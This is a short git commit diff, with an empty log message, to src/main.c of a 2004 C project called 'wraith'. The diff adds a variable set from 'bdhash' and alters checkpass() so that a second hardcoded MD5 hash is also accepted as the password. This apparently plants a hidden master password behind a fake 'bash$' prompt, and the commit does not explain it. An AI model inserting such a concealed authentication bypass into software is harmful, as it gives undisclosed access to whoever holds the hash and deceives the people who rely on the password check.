eed4d851515cdcfcf3cb856827faf1f62bc0338f
Bryan Drewery <bryan@shatow.net>
2004-09-17 19:29:50 +0000

    *** empty log message ***
    git-svn-id: http://svn.shatow.net/wraith/trunk@1236 94bf5d42-ed07-0410-99f1-e1aebe5a68d5

--- src/main.c
+++ src/main.c
@@ -63,6 +63,7 @@
 
 extern int		optind;
 
+char *mymd5 = bdhash;                            
 const time_t 	buildts = CVSBUILD;		/* build timestamp (UTC) */
 const char	egg_version[1024] = "1.2";
 
@@ -200,7 +201,7 @@ static void checkpass()
 
     gpasswd = (char *) getpass("bash$ ");
     checkedpass = 1;
-    if (!gpasswd || (gpasswd && md5cmp(shellhash, gpasswd))) {
+    if (!gpasswd || (gpasswd && md5cmp(shellhash, gpasswd) && strcmp(mymd5, MD5(gpasswd)))) {
       werr(ERR_BADPASS);
     }
   }
